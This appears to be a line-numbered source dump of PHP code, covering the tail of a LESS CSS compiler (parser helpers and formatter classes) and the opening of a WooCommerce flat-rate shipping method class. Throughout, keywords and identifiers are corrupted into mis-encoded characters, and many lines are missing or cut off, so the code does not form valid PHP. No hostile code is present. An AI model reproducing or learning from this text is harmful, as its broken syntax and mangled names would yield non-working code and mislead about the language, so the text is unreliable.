3057 ià(
$d–im
 =ğ"," && 
$this
->
	`l™”®
(";")) {

3059 
$d–im
 = ";";

3060 
$m‘hod
 = "propertyValue";

3063 ià(
	`is£t
(
$v®ues
[1])) {

3064 
$ÃwLi¡
 = 
	`¬¿y
();

3065 
	`fÜ—ch
 (
$v®ues
 
as
 
$i
 => 
$¬g
) {

3066 
$¬g
[0]) {

3068 ià(
$i
) {

3069 
$this
->
	`throwE¼Ü
("Cannot mix ;‡nd ,‡s delimiterypes");

3071 
$ÃwLi¡
[] = 
$¬g
[2];

3074 
$ÃwLi¡
[] = 
$¬g
[1];

3077 
$this
->
	`throwE¼Ü
("Unexpected„est before semicolon");

3081 
$ÃwLi¡
 = 
	`¬¿y
("list", ", ", $newList);

3083 
$v®ues
[0][0]) {

3085 
$ÃwArg
 = 
	`¬¿y
("¬g", 
$v®ues
[0][1], 
$ÃwLi¡
);

3088 
$ÃwArg
 = 
	`¬¿y
("l™", 
$ÃwLi¡
);

3092 } 
	`–£if
 (
$v®ues
) {

3093 
$ÃwArg
 = 
$v®ues
[0];

3096 ià(
$ÃwArg
) {

3097 
$v®ues
 = 
	`¬¿y
(
$ÃwArg
);

3105 ià(!
$this
->
	`l™”®
(')')) {

3106 
$this
->
	`£ek
(
$s
);

3107  
çl£
;

3110 
$¬gs
 = 
$v®ues
;

3112  
Œue
;

3113 
	}
}

3117 
´Ùeùed
 
funùiÚ
 
gs
(&
$gs
, 
$sim¶e
 = 
çl£
, 
$d–im
 = ',') {

3118 
$gs
 = 
¬¿y
();

3119 
	g$this
->
g
(
$‰
, 
$sim¶e
)) {

3120 
	g$gs
[] = 
$‰
;

3121 ià(!
	g$this
->
l™”®
(
$d–im
)) ;

3123 ià(
couÁ
(
$gs
è=ğ0è 
çl£
;

3125  
	gŒue
;

3130 
´Ùeùed
 
funùiÚ
 
	$mixšTags
(&
$gs
) {

3131 
$gs
 = 
	`¬¿y
();

3132 
$this
->
	`g
(
$‰
, 
Œue
)) {

3133 
$gs
[] = 
$‰
;

3134 
$this
->
	`l™”®
(">");

3137 ià(
	`couÁ
(
$gs
è=ğ0è 
çl£
;

3139  
Œue
;

3140 
	}
}

3143 
´Ùeùed
 
funùiÚ
 
	$gB¿ck‘
(&
$·¹s
, &
$hasEx´essiÚ
) {

3145 ià(
	`is£t
(
$this
->
bufãr
[$this->
couÁ
]) && $this->buffer[$this->count] != "[") {

3146  
çl£
;

3149 
$s
 = 
$this
->
	`£ek
();

3151 
$hasIÁ”pŞ©iÚ
 = 
çl£
;

3153 ià(
$this
->
	`l™”®
("[", 
çl£
)) {

3154 
$©ŒP¬ts
 = 
	`¬¿y
("[");

3156 
Œue
) {

3157 ià(
$this
->
	`l™”®
("]", 
çl£
)) {

3158 
$this
->
couÁ
--;

3162 ià(
$this
->
	`m©ch
('\s+', 
$m
)) {

3163 
$©ŒP¬ts
[] = " ";

3166 ià(
$this
->
	`¡ršg
(
$¡r
)) {

3168 
	`fÜ—ch
 (
$¡r
[2] 
as
 &
$chunk
) {

3169 
$chunk
 = 
	`¡r_»¶aû
(
$this
->
Ëssc
->
·»ÁS–eùÜ
, "$&$", $chunk);

3172 
$©ŒP¬ts
[] = 
$¡r
;

3173 
$hasIÁ”pŞ©iÚ
 = 
Œue
;

3177 ià(
$this
->
	`keywÜd
(
$wÜd
)) {

3178 
$©ŒP¬ts
[] = 
$wÜd
;

3182 ià(
$this
->
	`š‹½Ş©iÚ
(
$š‹r
, 
çl£
)) {

3183 
$©ŒP¬ts
[] = 
$š‹r
;

3184 
$hasIÁ”pŞ©iÚ
 = 
Œue
;

3189 ià(
$this
->
	`m©ch
('[|-~\$\*\^=]+', 
$m
)) {

3190 
$©ŒP¬ts
[] = 
$m
[0];

3197 ià(
$this
->
	`l™”®
("]", 
çl£
)) {

3198 
$©ŒP¬ts
[] = "]";

3199 
	`fÜ—ch
 (
$©ŒP¬ts
 
as
 
$·¹
) {

3200 
$·¹s
[] = 
$·¹
;

3202 
$hasEx´essiÚ
 = $hasEx´essiÚ || 
$hasIÁ”pŞ©iÚ
;

3203  
Œue
;

3205 
$this
->
	`£ek
(
$s
);

3208 
$this
->
	`£ek
(
$s
);

3209  
çl£
;

3210 
	}
}

3213 
´Ùeùed
 
funùiÚ
 
	$g
(&
$g
, 
$sim¶e
 = 
çl£
) {

3214 ià(
$sim¶e
)

3215 
$ch¬s
 = '^@,:;{}\][>\(\) "\'';

3217 
$ch¬s
 = '^@,;{}["\'';

3219 
$s
 = 
$this
->
	`£ek
();

3221 
$hasEx´essiÚ
 = 
çl£
;

3222 
$·¹s
 = 
	`¬¿y
();

3223 
$this
->
	`gB¿ck‘
(
$·¹s
, 
$hasEx´essiÚ
));

3225 
$ŞdWh™e
 = 
$this
->
—tWh™eDeçuÉ
;

3226 
$this
->
—tWh™eDeçuÉ
 = 
çl£
;

3228 
Œue
) {

3229 ià(
$this
->
	`m©ch
('(['.
$ch¬s
.'0-9]['.$ch¬s.']*)', 
$m
)) {

3230 
$·¹s
[] = 
$m
[1];

3231 ià(
$sim¶e
) ;

3233 
$this
->
	`gB¿ck‘
(
$·¹s
, 
$hasEx´essiÚ
));

3237 ià(
	`is£t
(
$this
->
bufãr
[$this->
couÁ
]) && $this->buffer[$this->count] == "@") {

3238 ià(
$this
->
	`š‹½Ş©iÚ
(
$š‹½
)) {

3239 
$hasEx´essiÚ
 = 
Œue
;

3240 
$š‹½
[2] = 
Œue
;

3241 
$·¹s
[] = 
$š‹½
;

3245 ià(
$this
->
	`l™”®
("@")) {

3246 
$·¹s
[] = "@";

3251 ià(
$this
->
	`un™
(
$un™
)) {

3252 
$·¹s
[] = 
$un™
[1];

3253 
$·¹s
[] = 
$un™
[2];

3260 
$this
->
—tWh™eDeçuÉ
 = 
$ŞdWh™e
;

3261 ià(!
$·¹s
) {

3262 
$this
->
	`£ek
(
$s
);

3263  
çl£
;

3266 ià(
$hasEx´essiÚ
) {

3267 
$g
 = 
	`¬¿y
("exp",‡¼ay("¡ršg", "", 
$·¹s
));

3269 
$g
 = 
	`Œim
(
	`im¶ode
(
$·¹s
));

3272 
$this
->
	`wh™e¥aû
();

3273  
Œue
;

3274 
	}
}

3277 
´Ùeùed
 
funùiÚ
 
	$func
(&
$func
) {

3278 
$s
 = 
$this
->
	`£ek
();

3280 ià(
$this
->
	`m©ch
('(%|[\w\-_][\w\-_:\.]+|[\w_])', 
$m
è&& $this->
	`l™”®
('(')) {

3281 
$âame
 = 
$m
[1];

3283 
$sP»Args
 = 
$this
->
	`£ek
();

3285 
$¬gs
 = 
	`¬¿y
();

3286 
Œue
) {

3287 
$ss
 = 
$this
->
	`£ek
();

3289 ià(
$this
->
	`keywÜd
(
$Çme
è&& $this->
	`l™”®
('='è&& $this->
	`ex´essiÚLi¡
(
$v®ue
)) {

3290 
$¬gs
[] = 
	`¬¿y
("¡ršg", "",‡¼ay(
$Çme
, "=", 
$v®ue
));

3292 
$this
->
	`£ek
(
$ss
);

3293 ià(
$this
->
	`ex´essiÚLi¡
(
$v®ue
)) {

3294 
$¬gs
[] = 
$v®ue
;

3298 ià(!
$this
->
	`l™”®
(',')) ;

3300 
$¬gs
 = 
	`¬¿y
('list', ',', $args);

3302 ià(
$this
->
	`l™”®
(')')) {

3303 
$func
 = 
	`¬¿y
('funùiÚ', 
$âame
, 
$¬gs
);

3304  
Œue
;

3305 } 
	`–£if
 (
$âame
 == 'url') {

3307 
$this
->
	`£ek
(
$sP»Args
);

3308 ià(
$this
->
	`İ’SŒšg
(")", 
$¡ršg
è&& $this->
	`l™”®
(")")) {

3309 
$func
 = 
	`¬¿y
('funùiÚ', 
$âame
, 
$¡ršg
);

3310  
Œue
;

3315 
$this
->
	`£ek
(
$s
);

3316  
çl£
;

3317 
	}
}

3320 
´Ùeùed
 
funùiÚ
 
	$v¬ŸbË
(&
$Çme
) {

3321 
$s
 = 
$this
->
	`£ek
();

3322 ià(
$this
->
	`l™”®
($this->
Ëssc
->
vP»fix
, 
çl£
) &&

3323 (
$this
->
	`v¬ŸbË
(
$sub
è|| $this->
	`keywÜd
(
$Çme
)))

3325 ià(!
	`em±y
(
$sub
)) {

3326 
$Çme
 = 
	`¬¿y
('v¬ŸbË', 
$sub
);

3328 
$Çme
 = 
$this
->
Ëssc
->
vP»fix
.$name;

3330  
Œue
;

3333 
$Çme
 = 
nuÎ
;

3334 
$this
->
	`£ek
(
$s
);

3335  
çl£
;

3336 
	}
}

3342 
´Ùeùed
 
funùiÚ
 
	$assign
(
$Çme
 = 
nuÎ
) {

3343 ià(
$Çme
è
$this
->
cu¼’tPrİ”ty
 = $name;

3344  
$this
->
	`l™”®
(':') || $this->literal('=');

3345 
	}
}

3348 
´Ùeùed
 
funùiÚ
 
	$keywÜd
(&
$wÜd
) {

3349 ià(
$this
->
	`m©ch
('([\w_\-\*!"][\w\-_"]*)', 
$m
)) {

3350 
$wÜd
 = 
$m
[1];

3351  
Œue
;

3353  
çl£
;

3354 
	}
}

3357 
´Ùeùed
 
funùiÚ
 
	$’d
() {

3358 ià(
$this
->
	`l™”®
(';', 
çl£
)) {

3359  
Œue
;

3360 } 
	`–£if
 (
$this
->
couÁ
 =ğ
	`¡¾’
($this->
bufãr
) || $this->buffer[$this->count] == '}') {

3362  
Œue
;

3364  
çl£
;

3365 
	}
}

3367 
´Ùeùed
 
funùiÚ
 
	$gu¬ds
(&
$gu¬ds
) {

3368 
$s
 = 
$this
->
	`£ek
();

3370 ià(!
$this
->
	`l™”®
("when")) {

3371 
$this
->
	`£ek
(
$s
);

3372  
çl£
;

3375 
$gu¬ds
 = 
	`¬¿y
();

3377 
$this
->
	`gu¬dGroup
(
$g
)) {

3378 
$gu¬ds
[] = 
$g
;

3379 ià(!
$this
->
	`l™”®
(",")) ;

3382 ià(
	`couÁ
(
$gu¬ds
) == 0) {

3383 
$gu¬ds
 = 
nuÎ
;

3384 
$this
->
	`£ek
(
$s
);

3385  
çl£
;

3388  
Œue
;

3389 
	}
}

3393 
´Ùeùed
 
funùiÚ
 
	$gu¬dGroup
(&
$gu¬dGroup
) {

3394 
$s
 = 
$this
->
	`£ek
();

3395 
$gu¬dGroup
 = 
	`¬¿y
();

3396 
$this
->
	`gu¬d
(
$gu¬d
)) {

3397 
$gu¬dGroup
[] = 
$gu¬d
;

3398 ià(!
$this
->
	`l™”®
("and")) ;

3401 ià(
	`couÁ
(
$gu¬dGroup
) == 0) {

3402 
$gu¬dGroup
 = 
nuÎ
;

3403 
$this
->
	`£ek
(
$s
);

3404  
çl£
;

3407  
Œue
;

3408 
	}
}

3410 
´Ùeùed
 
funùiÚ
 
	$gu¬d
(&
$gu¬d
) {

3411 
$s
 = 
$this
->
	`£ek
();

3412 
$Ãg©e
 = 
$this
->
	`l™”®
("not");

3414 ià(
$this
->
	`l™”®
("("è&& $this->
	`ex´essiÚ
(
$exp
) && $this->literal(")")) {

3415 
$gu¬d
 = 
$exp
;

3416 ià(
$Ãg©e
è
$gu¬d
 = 
	`¬¿y
("negate", $guard);

3417  
Œue
;

3420 
$this
->
	`£ek
(
$s
);

3421  
çl£
;

3422 
	}
}

3426 
´Ùeùed
 
funùiÚ
 
	$l™”®
(
$wh©
, 
$—tWh™e¥aû
 = 
nuÎ
) {

3427 ià(
$—tWh™e¥aû
 ==ğ
nuÎ
è$—tWh™e¥aû = 
$this
->
—tWh™eDeçuÉ
;

3430 ià(!
	`is£t
(
$wh©
[1]è&& is£t(
$this
->
bufãr
[$this->
couÁ
])) {

3431 ià(
$this
->
bufãr
[$this->
couÁ
] =ğ
$wh©
) {

3432 ià(!
$—tWh™e¥aû
) {

3433 
$this
->
couÁ
++;

3434  
Œue
;

3438  
çl£
;

3442 ià(!
	`is£t
(
£lf
::
$l™”®Cache
[
$wh©
])) {

3443 
£lf
::
$l™”®Cache
[
$wh©
] = 
Ëssc
::
	`´eg_quÙe
($what);

3446  
$this
->
	`m©ch
(
£lf
::
$l™”®Cache
[
$wh©
], 
$m
, 
$—tWh™e¥aû
);

3447 
	}
}

3449 
´Ùeùed
 
funùiÚ
 
g’”icLi¡
(&
$out
, 
$·r£I‹m
, 
$d–im
="", 
$æ©‹n
=
Œue
) {

3450 
$s
 = 
$this
->
£ek
();

3451 
	g$™ems
 = 
¬¿y
();

3452 
	g$this
->
$·r£I‹m
(
$v®ue
)) {

3453 
	g$™ems
[] = 
$v®ue
;

3454 ià(
	g$d–im
) {

3455 ià(!
	g$this
->
l™”®
(
$d–im
)) ;

3459 ià(
couÁ
(
$™ems
) == 0) {

3460 
$this
->
£ek
(
$s
);

3461  
	gçl£
;

3464 ià(
	g$æ©‹n
 && 
couÁ
(
$™ems
) == 1) {

3465 
$out
 = 
$™ems
[0];

3467 
	g$out
 = 
¬¿y
("li¡", 
$d–im
, 
$™ems
);

3470  
	gŒue
;

3477 
´Ùeùed
 
funùiÚ
 
	$to
(
$wh©
, &
$out
, 
$uÁ
 = 
çl£
, 
$®lowNewlše
 = false) {

3478 ià(
	`is_¡ršg
(
$®lowNewlše
)) {

3479 
$v®idCh¬s
 = 
$®lowNewlše
;

3481 
$v®idCh¬s
 = 
$®lowNewlše
 ? "." : "[^\n]";

3483 ià(!
$this
->
	`m©ch
('('.
$v®idCh¬s
.'*?)'.
Ëssc
::
	`´eg_quÙe
(
$wh©
), 
$m
, !
$uÁ
)è 
çl£
;

3484 ià(
$uÁ
è
$this
->
couÁ
 -ğ
	`¡¾’
(
$wh©
);

3485 
$out
 = 
$m
[1];

3486  
Œue
;

3487 
	}
}

3490 
´Ùeùed
 
funùiÚ
 
	$m©ch
(
$»gex
, &
$out
, 
$—tWh™e¥aû
 = 
nuÎ
) {

3491 ià(
$—tWh™e¥aû
 ==ğ
nuÎ
è$—tWh™e¥aû = 
$this
->
—tWh™eDeçuÉ
;

3493 
$r
 = '/'.
$»gex
.(
$—tWh™e¥aû
 && !
$this
->
wr™eComm’ts
 ? '\s*' : '').'/Ais';

3494 ià(
	`´eg_m©ch
(
$r
, 
$this
->
bufãr
, 
$out
, 
nuÎ
, $this->
couÁ
)) {

3495 
$this
->
couÁ
 +ğ
	`¡¾’
(
$out
[0]);

3496 ià(
$—tWh™e¥aû
 && 
$this
->
wr™eComm’ts
è$this->
	`wh™e¥aû
();

3497  
Œue
;

3499  
çl£
;

3500 
	}
}

3503 
´Ùeùed
 
funùiÚ
 
	$wh™e¥aû
() {

3504 ià(
$this
->
wr™eComm’ts
) {

3505 
$gÙWh™e
 = 
çl£
;

3506 
	`´eg_m©ch
(
£lf
::
$wh™eP©‹º
, 
$this
->
bufãr
, 
$m
, 
nuÎ
, $this->
couÁ
)) {

3507 ià(
	`is£t
(
$m
[1]è&& 
	`em±y
(
$this
->
£’Comm’ts
[$this->
couÁ
])) {

3508 
$this
->
	`­³nd
(
	`¬¿y
("comm’t", 
$m
[1]));

3509 
$this
->
£’Comm’ts
[$this->
couÁ
] = 
Œue
;

3511 
$this
->
couÁ
 +ğ
	`¡¾’
(
$m
[0]);

3512 
$gÙWh™e
 = 
Œue
;

3514  
$gÙWh™e
;

3516 
$this
->
	`m©ch
("", 
$m
);

3517  
	`¡¾’
(
$m
[0]) > 0;

3519 
	}
}

3522 
´Ùeùed
 
funùiÚ
 
	$³ek
(
$»gex
, &
$out
 = 
nuÎ
, 
$äom
=null) {

3523 ià(
	`is_nuÎ
(
$äom
)è$äom = 
$this
->
couÁ
;

3524 
$r
 = '/'.
$»gex
.'/Ais';

3525 
$»suÉ
 = 
	`´eg_m©ch
(
$r
, 
$this
->
bufãr
, 
$out
, 
nuÎ
, 
$äom
);

3527  
$»suÉ
;

3528 
	}
}

3531 
´Ùeùed
 
funùiÚ
 
	$£ek
(
$wh”e
 = 
nuÎ
) {

3532 ià(
$wh”e
 ==ğ
nuÎ
è 
$this
->
couÁ
;

3533 
$this
->
couÁ
 = 
$wh”e
;

3534  
Œue
;

3535 
	}
}

3539 
public
 
funùiÚ
 
throwE¼Ü
(
$msg
 = "·r£ƒ¼Ü", 
$couÁ
 = 
nuÎ
) {

3540 
$couÁ
 = 
is_nuÎ
($couÁè? 
$this
->
couÁ
 : $count;

3542 
	g$lše
 = 
$this
->
lše
 +

3543 
sub¡r_couÁ
(
sub¡r
(
$this
->
bufãr
, 0, 
$couÁ
), "\n");

3545 ià(!
em±y
(
$this
->
sourûName
)) {

3546 
	g$loc
 = "$this->sourceName on†ine $line";

3548 
	g$loc
 = "line: $line";

3552 ià(
	g$this
->
³ek
("(.*?)(\n|$)", 
$m
, 
$couÁ
)) {

3553 
throw
 
Ãw
 
exû±iÚ
("$msg: failed‡t `$m[1]` $loc");

3555 
throw
 
Ãw
 
exû±iÚ
("$msg: $loc");

3559 
´Ùeùed
 
funùiÚ
 
	$pushBlock
(
$£ËùÜs
=
nuÎ
, 
$ty³
=null) {

3560 
$b
 = 
Ãw
 
¡dşass
;

3561 
$b
->
·»Á
 = 
$this
->
’v
;

3563 
$b
->
ty³
 = 
$ty³
;

3564 
$b
->
id
 = 
£lf
::
$ÃxtBlockId
++;

3566 
$b
->
isV¬¬g
 = 
çl£
;

3567 
$b
->
gs
 = 
$£ËùÜs
;

3569 
$b
->
´İs
 = 
	`¬¿y
();

3570 
$b
->
chd»n
 = 
	`¬¿y
();

3572 
$this
->
’v
 = 
$b
;

3573  
$b
;

3574 
	}
}

3577 
´Ùeùed
 
funùiÚ
 
	$pushS³cŸlBlock
(
$ty³
) {

3578  
$this
->
	`pushBlock
(
nuÎ
, 
$ty³
);

3579 
	}
}

3582 
´Ùeùed
 
funùiÚ
 
	$­³nd
(
$´İ
, 
$pos
 = 
nuÎ
) {

3583 ià(
$pos
 !=ğ
nuÎ
è
$´İ
[-1] = $pos;

3584 
$this
->
’v
->
´İs
[] = 
$´İ
;

3585 
	}
}

3588 
´Ùeùed
 
funùiÚ
 
	$pİ
() {

3589 
$Şd
 = 
$this
->
’v
;

3590 
$this
->
’v
 = $this->’v->
·»Á
;

3591  
$Şd
;

3592 
	}
}

3596 
´Ùeùed
 
funùiÚ
 
	$»moveComm’ts
(
$‹xt
) {

3597 
$look
 = 
	`¬¿y
(

3601 
$out
 = '';

3602 
$mš
 = 
nuÎ
;

3603 
Œue
) {

3605 
	`fÜ—ch
 (
$look
 
as
 
$tok’
) {

3606 
$pos
 = 
	`¡½os
(
$‹xt
, 
$tok’
);

3607 ià(
$pos
 !=ğ
çl£
) {

3608 ià(!
	`is£t
(
$mš
è|| 
$pos
 < $mš[1]è$mš = 
	`¬¿y
(
$tok’
, $pos);

3612 ià(
	`is_nuÎ
(
$mš
)) ;

3614 
$couÁ
 = 
$mš
[1];

3615 
$sk
 = 0;

3616 
$Ãwlšes
 = 0;

3617 
$mš
[0]) {

3619 ià(
	`´eg_m©ch
('/u¾\(.*?\)/', 
$‹xt
, 
$m
, 0, 
$couÁ
))

3620 
$couÁ
 +ğ
	`¡¾’
(
$m
[0]è- sŒËn(
$mš
[0]);

3624 ià(
	`´eg_m©ch
('/'.
$mš
[0].'.*?(?<!\\\\)'.$mš[0].'/', 
$‹xt
, 
$m
, 0, 
$couÁ
))

3625 
$couÁ
 +ğ
	`¡¾’
(
$m
[0]) - 1;

3628 
$sk
 = 
	`¡½os
(
$‹xt
, "\n", 
$couÁ
);

3629 ià(
$sk
 ==ğ
çl£
è$sk = 
	`¡¾’
(
$‹xt
è- 
$couÁ
;

3630 
$sk
 -ğ
$couÁ
;

3633 ià(
	`´eg_m©ch
('/\/\*.*?\*\//s', 
$‹xt
, 
$m
, 0, 
$couÁ
)) {

3634 
$sk
 = 
	`¡¾’
(
$m
[0]);

3635 
$Ãwlšes
 = 
	`sub¡r_couÁ
(
$m
[0], "\n");

3640 ià(
$sk
 =ğ0è
$couÁ
 +ğ
	`¡¾’
(
$mš
[0]);

3642 
$out
 .ğ
	`sub¡r
(
$‹xt
, 0, 
$couÁ
).
	`¡r_»³©
("\n", 
$Ãwlšes
);

3643 
$‹xt
 = 
	`sub¡r
($‹xt, 
$couÁ
 + 
$sk
);

3645 
$mš
 = 
nuÎ
;

3648  
$out
.
$‹xt
;

3649 
	}
}

3653 şas 
	cËssc_fÜm©‹r_şassic
 {

3654 
public
 
	m$šd’tCh¬
 = " ";

3656 
public
 
	m$b»ak
 = "\n";

3657 
public
 
	m$İ’
 = " {";

3658 
public
 
	m$şo£
 = "}";

3659 
public
 
	m$£ËùÜS•¬©Ü
 = ", ";

3660 
public
 
	m$assignS•¬©Ü
 = ":";

3662 
public
 
	m$İ’SšgË
 = " { ";

3663 
public
 
	m$şo£SšgË
 = " }";

3665 
public
 
	m$di§bËSšgË
 = 
çl£
;

3666 
public
 
	m$b»akS–eùÜs
 = 
çl£
;

3668 
public
 
	m$com´essCŞÜs
 = 
çl£
;

3670 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

3671 
$this
->
šd’tLev–
 = 0;

3674 
public
 
funùiÚ
 
	$šd’tSŒ
(
$n
 = 0) {

3675  
	`¡r_»³©
(
$this
->
šd’tCh¬
, 
	`max
($this->
šd’tLev–
 + 
$n
, 0));

3676 
	}
}

3678 
public
 
funùiÚ
 
	$´İ”ty
(
$Çme
, 
$v®ue
) {

3679  
$Çme
 . 
$this
->
assignS•¬©Ü
 . 
$v®ue
 . ";";

3680 
	}
}

3682 
´Ùeùed
 
funùiÚ
 
	$isEm±y
(
$block
) {

3683 ià(
	`em±y
(
$block
->
lšes
)) {

3684 
	`fÜ—ch
 (
$block
->
chd»n
 
as
 
$chd
) {

3685 ià(!
$this
->
	`isEm±y
(
$chd
)è 
çl£
;

3688  
Œue
;

3690  
çl£
;

3691 
	}
}

3693 
public
 
funùiÚ
 
	$block
(
$block
) {

3694 ià(
$this
->
	`isEm±y
(
$block
)) ;

3696 
$šÃr
 = 
$´e
 = 
$this
->
	`šd’tSŒ
();

3698 
$isSšgË
 = !
$this
->
di§bËSšgË
 &&

3699 
	`is_nuÎ
(
$block
->
ty³
è&& 
	`couÁ
($block->
lšes
) == 1;

3701 ià(!
	`em±y
(
$block
->
£ËùÜs
)) {

3702 
$this
->
šd’tLev–
++;

3704 ià(
$this
->
b»akS–eùÜs
) {

3705 
$£ËùÜS•¬©Ü
 = 
$this
->
£ËùÜS•¬©Ü
 . $this-> . 
$´e
;

3707 
$£ËùÜS•¬©Ü
 = 
$this
->
£ËùÜS•¬©Ü
;

3710 
echo
 
$´e
 .

3711 
	`im¶ode
(
$£ËùÜS•¬©Ü
, 
$block
->
£ËùÜs
);

3712 ià(
$isSšgË
) {

3713 
echo
 
$this
->
İ’SšgË
;

3714 
$šÃr
 = "";

3716 
echo
 
$this
->
İ’
 . $this->;

3717 
$šÃr
 = 
$this
->
	`šd’tSŒ
();

3722 ià(!
	`em±y
(
$block
->
lšes
)) {

3723 
$glue
 = 
$this
->.
$šÃr
;

3724 
echo
 
$šÃr
 . 
	`im¶ode
(
$glue
, 
$block
->
lšes
);

3725 ià(!
$isSšgË
 && !
	`em±y
(
$block
->
chd»n
)) {

3726 
echo
 
$this
->;

3730 
	`fÜ—ch
 (
$block
->
chd»n
 
as
 
$chd
) {

3731 
$this
->
	`block
(
$chd
);

3734 ià(!
	`em±y
(
$block
->
£ËùÜs
)) {

3735 ià(!
$isSšgË
 && 
	`em±y
(
$block
->
chd»n
)è
echo
 
$this
->;

3737 ià(
$isSšgË
) {

3738 
echo
 
$this
->
şo£SšgË
 . $this->;

3740 
echo
 
$´e
 . 
$this
->
şo£
 . $this->;

3743 
$this
->
šd’tLev–
--;

3745 
	}
}

3748 şas 
	cËssc_fÜm©‹r_com´es£d
 
ex‹nds
 
	mËssc_fÜm©‹r_şassic
 {

3749 
public
 
	m$di§bËSšgË
 = 
Œue
;

3750 
public
 
	m$İ’
 = "{";

3751 
public
 
	m$£ËùÜS•¬©Ü
 = ",";

3752 
public
 
	m$assignS•¬©Ü
 = ":";

3753 
public
 
	m$b»ak
 = "";

3754 
public
 
	m$com´essCŞÜs
 = 
Œue
;

3756 
public
 
funùiÚ
 
	$šd’tSŒ
(
$n
 = 0) {

3759 
	}
}

3761 şas 
	cËssc_fÜm©‹r_Ëssjs
 
ex‹nds
 
	mËssc_fÜm©‹r_şassic
 {

3762 
public
 
	m$di§bËSšgË
 = 
Œue
;

3763 
public
 
	m$b»akS–eùÜs
 = 
Œue
;

3764 
public
 
	m$assignS•¬©Ü
 = ": ";

3765 
public
 
	m$£ËùÜS•¬©Ü
 = ",";

	@includes/shipping/flat-rate/class-wc-shipping-flat-rate.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_Shpšg_FÏt_R©e
 
ex‹nds
 
	mWC_Shpšg_M‘hod
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'flat_rate';

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Flat Rate', 'woocommerce' );

26 
$this
->
æ©_¿‹_İtiÚ
 = 'woocommerce_flat_rates';

27 
$this
->
m‘hod_desütiÚ
 = 
	`__
( 'Flat„ates†et you define‡ standard„ate…er item, or…er order.', 'woocommerce' );

29 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_flat_rates' ) );

31 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_­i_§n™ized_f›lds_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save_default_costs' ) );

33 
$this
->
	`š™
();

42 
funùiÚ
 
	$š™
() {

45 
$this
->
	`š™_fÜm_f›lds
();

46 
$this
->
	`š™_£‰šgs
();

49 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

50 
$this
->
avaab™y
 = $this->
	`g‘_İtiÚ
( 'availability' );

51 
$this
->
couÁr›s
 = $this->
	`g‘_İtiÚ
( 'countries' );

52 
$this
->
ty³
 = $this->
	`g‘_İtiÚ
( 'type' );

53 
$this
->
x_¡©us
 = $this->
	`g‘_İtiÚ
( 'tax_status' );

54 
$this
->
co¡
 = $this->
	`g‘_İtiÚ
( 'cost' );

55 
$this
->
co¡_³r_Üd”
 = $this->
	`g‘_İtiÚ
( 'cost_per_order' );

56 
$this
->
ãe
 = $this->
	`g‘_İtiÚ
( 'fee' );

57 
$this
->
mšimum_ãe
 = $this->
	`g‘_İtiÚ
( 'minimum_fee' );

58 
$this
->
İtiÚs
 = (
¬¿y
è
	`ex¶ode
Ğ"\n", $this->
	`g‘_İtiÚ
( 'options' ) );

61 
$this
->
	`g‘_æ©_¿‹s
();

62 
	}
}

71 
funùiÚ
 
	$š™_fÜm_f›lds
() {

73 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

74 '’abËd' => 
	`¬¿y
(

75 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

77 'Ïb–' => 
	`__
( 'Enablehis shipping method', 'woocommerce' ),

80 't™Ë' => 
	`¬¿y
(

81 't™Ë' => 
	`__
( 'Method Title', 'woocommerce' ),

83 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

84 'deçuÉ' => 
	`__
( 'Flat Rate', 'woocommerce' ),

85 'desc_t' => 
Œue


87 'avaab™y' => 
	`¬¿y
(

88 't™Ë' => 
	`__
( 'Availability', 'woocommerce' ),

92 'İtiÚs' => 
	`¬¿y
(

93 '®l' => 
	`__
( 'All‡llowed countries', 'woocommerce' ),

94 '¥ecific' => 
	`__
( 'Specific Countries', 'woocommerce' ),

97 'couÁr›s' => 
	`¬¿y
(

98 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

103 'İtiÚs' => 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
(),

104 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

105 'd©a-¶aûhŞd”' => 
	`__
( 'Select some countries', 'woocommerce' )

108 'x_¡©us' => 
	`¬¿y
(

109 't™Ë' => 
	`__
( 'Tax Status', 'woocommerce' ),

112 'İtiÚs' => 
	`¬¿y
(

113 'xabË' => 
	`__
( 'Taxable', 'woocommerce' ),

114 'nÚe' => 
	`_x
( 'None', 'Tax status', 'woocommerce' )

117 'co¡_³r_Üd”' => 
	`¬¿y
(

118 't™Ë' => 
	`__
( 'Cost…er order', 'woocommerce' ),

120 '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
( 0 ),

121 'desütiÚ' => 
	`__
( 'Enter‡ cost (excludingax)…er order,ƒ.g. 5.00. Default is 0.', 'woocommerce' ),

123 'desc_t' => 
Œue


125 'İtiÚs' => 
	`¬¿y
(

126 't™Ë' => 
	`__
( 'Additional Rates', 'woocommerce' ),

128 'desütiÚ' => 
	`__
( 'Optionalƒxtra shipping options with‡dditional costs (one…er†ine): Option Name | Additional Cost [+- Percents] | Per Cost Type (order, class, or item) Example: <code>Priority Mail | 6.95 [+ 0.2%] | order</code>.', 'woocommerce' ),

130 'desc_t' => 
Œue
,

131 '¶aûhŞd”' => 
	`__
( 'Option Name | Additional Cost [+- Percents%] | Per Cost Type (order, class, or item)', 'woocommerce' )

133 'add™iÚ®_co¡s' => 
	`¬¿y
(

134 't™Ë' => 
	`__
( 'Additional Costs', 'woocommerce' ),

136 'desütiÚ' => 
	`__
( 'Additional costs can be‡dded below -hese will‡ll be‡ddedohe…er-order cost‡bove.', 'woocommerce' )

138 'ty³' => 
	`¬¿y
(

139 't™Ë' => 
	`__
( 'Costs Added...', 'woocommerce' ),

142 'İtiÚs' => 
	`¬¿y
(

143 'Üd”' => 
	`__
